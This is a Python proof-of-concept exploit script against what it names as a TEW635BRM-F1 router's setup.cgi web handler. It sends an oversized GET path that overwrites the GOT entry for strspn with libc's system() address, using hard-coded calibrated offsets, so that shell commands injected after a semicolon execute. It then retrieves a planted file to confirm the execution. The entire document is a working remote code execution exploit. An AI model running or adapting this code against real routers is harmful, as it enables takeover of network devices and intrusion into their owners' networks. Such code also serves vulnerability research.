#!/usr/bin/env python3
"""TEW635BRM-F1 PoC v2: hijack GOT[strspn]=system, semicolon command injection via path.
strspn(rewritten_url) -> system("/setup.cgi?next_file=/x.htm;CMD;...")
CMD must be lowercase + no spaces (strlowr + request-line parsing)."""
import socket, time, struct, sys

HOST, PORT = "127.0.0.1", 16358
SYSTEM = 0x77679ae0 # libc 0x7764e000 + 0x2bae0
OFF_STRSPN = 3863 # calibrated: GOT[strspn]=0x1000117c at buf[3863:3867]

CMD = sys.argv[1] if len(sys.argv) > 1 else "id>/usr/www/p.gif"

def build():
 buf = bytearray(b"a" * 3900)
 prefix = b"/x.htm;" + CMD.encode() + b";"
 buf[:len(prefix)] = prefix
 buf[OFF_STRSPN:OFF_STRSPN+4] = struct.pack(">I", SYSTEM)
 return b"/" + bytes(buf) + b".htm"

def fetch(url):
 s = socket.create_connection((HOST, PORT), timeout=6)
 s.sendall(f"GET {url} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n".encode())
 data = b""; s.settimeout(5)
 try:
 while True:
 c = s.recv(8192)
 if not c: break
 data += c
 except Exception:
 pass
 s.close()
 return data

if __name__ == "__main__":
 path = build()
 print(f"[*] path len={len(path)}, cmd='{CMD}'")
 req = b"GET " + path + b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
 s = socket.create_connection((HOST, PORT), timeout=8)
 s.sendall(req); time.sleep(1.2)
 try:
 s.settimeout(2); r = s.recv(512)
 print("[*] resp:", r[:100])
 except Exception as e:
 print("[*] no resp (expected if crash after exec):", type(e).__name__)
 s.close()
 time.sleep(0.8)
 proof = fetch("/p.gif")
 body = proof.split(b"\r\n\r\n", 1)[-1]
 print(f"[*] GET /p.gif -> {proof[:60]!r}")
 print(f"[*] body: {body[:120]!r}")
